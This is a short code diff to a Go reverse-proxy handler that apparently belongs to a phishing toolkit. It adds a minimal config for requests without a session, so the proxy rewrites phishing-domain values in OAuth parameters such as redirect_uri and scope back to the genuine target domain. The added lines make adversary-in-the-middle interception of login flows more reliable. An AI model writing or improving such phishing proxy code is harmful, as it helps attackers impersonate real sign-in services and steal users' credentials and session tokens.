@@ -525,6 +525,12 @@ func (m *ProxyHandler) prepareRequestWithoutSession(req *http.Request, reqCtx *R
 		}
 	}
 
+	// build ConfigMap for non-session requests so patchQueryParametersWithContext can
+	// reverse proxy domains back to original domains in OAuth params (redirect_uri, scope, etc.)
+	if reqCtx.ConfigMap == nil {
+		reqCtx.ConfigMap = m.createMinimalConfig(reqCtx.PhishDomain, reqCtx.TargetDomain)
+	}
+
 	// normalize headers
 	m.normalizeRequestHeaders(req, dummySession)
 
